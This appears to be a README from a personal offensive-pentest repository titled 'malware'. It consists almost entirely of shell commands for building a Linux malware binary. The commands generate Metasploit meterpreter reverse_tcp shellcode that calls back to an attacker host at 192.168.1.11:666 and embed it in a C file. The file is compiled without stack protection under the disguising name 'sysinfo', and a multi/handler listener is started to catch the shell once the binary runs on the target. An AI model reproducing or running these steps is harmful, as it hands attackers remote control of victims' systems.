# malware
My personal Python Scripts Base on Python for Offensive Pentest
### warning
The public and private keys that i have used in TCP reverse shell base on Hybrid encryption is just a test...!
in real world you should protect your real private key!
#### using payload.c (simple malware in c with meterpreter shellcode)
      sudo apt-get update && apt-get install gcc
      ## Build raw shellcode in C
      # WARNING: Replace LHOST value by your ip address
      # WARNING: If your attacking a x86 bit system, then change the arch from x64 to x86
      sudo msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.11 LPORT=666 -a x64 --platform linux -f c -o chars.raw


      ## see whats written inside template (optional)
      cat chars.raw --------> replace this shellcode into default shellcode incode
      ## compile payload.c to payload (using gcc)
      sudo gcc -fno-stack-protector -z execstack payload.c -o sysinfo


      ## start multi-handler
      # WARNING: Replace LHOST value by your ip address
      # WARNING: If your attacking a x86 bit system, then change the arch from x64 to x86
      sudo msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.11; set LPORT 666; set PAYLOAD linux/x64/meterpreter/reverse_tcp; exploit'


      ## execute payload on target system
      sudo chmod +x sysinfo && ./sysinfo
      
